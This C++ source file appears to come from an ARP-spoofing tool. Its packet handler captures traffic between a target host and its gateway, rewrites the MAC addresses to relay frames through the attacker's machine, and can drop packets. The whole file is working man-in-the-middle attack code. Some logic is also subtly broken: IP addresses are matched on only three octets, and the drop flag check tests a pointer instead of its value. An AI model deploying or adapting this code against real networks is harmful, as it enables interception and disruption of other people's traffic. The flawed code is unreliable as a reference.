#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"

void PacketHandler::packet_handler_f(u_char *param,
                                     const struct pcap_pkthdr *header,
                                     const u_char *pkt_data) {
    // Parse user parameters
    auto *args = (pkt_handler_args *) param;
    bool *will_drop_pkt = args->will_drop_pkt;
    bool *to_stop = args->to_stop;
    pcap_t *adapter = args->adapter;
    u_char *self_mac = args->self_mac;
    u_char *gateway_mac = args->gateway_mac;
    u_char *target_mac = args->target_mac;
    u_char *target_ip = args->target_ip;

    // Parse packet data
    auto *eh = (ethernet_header *) pkt_data;
    auto *ih = (ip_header *) (pkt_data + sizeof(ethernet_header));

#ifdef DEBUG
    printf("in pcap_loop...\n");
#endif

    if (*to_stop) {
        pcap_breakloop(adapter);
    }

    // If packet is sent from gateway to target
    if (equal(ih->destination_addr, ih->destination_addr + 3,
              target_ip)) {
        printf("To Target:\t%d.%d.%d.%d -> %d.%d.%d.%d\n",
               EXPAND_IP(ih->source_addr),
               EXPAND_IP(target_ip));

        if (!will_drop_pkt) {
            std::copy(self_mac, self_mac + 6, eh->src_mac);
            std::copy(target_mac, target_mac + 6, eh->dst_mac);

            if (pcap_sendpacket(adapter,
                                (const u_char *) pkt_data,
                                header->len
            ) < 0) {
                pcap_perror(adapter, "[packet_handler_f] "
                                     "Error occurred when forwarding packet to "
                                     "target: ");
                *to_stop = true;
            }
        }
    }

    // If packet is sent from target to gateway
    if (equal(ih->source_addr, ih->source_addr + 3,
              target_ip)) {
        printf("From Target:\t%d.%d.%d.%d -> %d.%d.%d.%d\n",
               EXPAND_IP(target_ip),
               EXPAND_IP(ih->destination_addr));

        if (!will_drop_pkt) {
            std::copy(self_mac, self_mac + 6, eh->src_mac);
            std::copy(gateway_mac, gateway_mac + 6, eh->dst_mac);

            if (pcap_sendpacket(adapter,
                                (const u_char *) pkt_data,
                                header->len
            ) < 0) {
                pcap_perror(adapter, "[packet_handler_f] "
                                     "Error occurred when forwarding packet to "
                                     "gateway: ");
                *to_stop = true;
            }
        }
    }
}

void PacketHandler::start() {
    pkt_handler_args args;
    args.will_drop_pkt = &m_will_drop_pkt;
    args.to_stop = &m_to_stop;
    args.adapter = m_adapter;
    args.self_mac = m_self_mac;
    args.target_mac = m_target_mac;
    args.gateway_mac = m_gateway_mac;
    args.target_ip = m_target_ip;

    auto pcap_loop_lambda_f = [this, args]() {
        pcap_loop(m_adapter, 0,
                  &PacketHandler::packet_handler_f, (u_char *) &args);
    };

    m_pcap_loop_t = thread(pcap_loop_lambda_f);
}

void PacketHandler::stop() {
    if (m_pcap_loop_t.joinable()) {
        m_to_stop = true;
        m_pcap_loop_t.join();
    }
    m_to_stop = false;
}

PacketHandler::PacketHandler(pcap_t *adapter, u_char self_mac[6],
                             u_char target_mac[6], u_char gateway_mac[6],
                             u_char target_ip[4])
        : m_adapter(adapter), m_to_stop(false), m_will_drop_pkt(false) {
    std::copy(target_ip, target_ip + 4, m_target_ip);
    std::copy(self_mac, self_mac + 6, m_self_mac);
    std::copy(gateway_mac, gateway_mac + 6, m_gateway_mac);
    std::copy(target_mac, target_mac + 6, m_target_mac);
}

void PacketHandler::set_drop_packet(bool v) {
    m_will_drop_pkt = v;
}

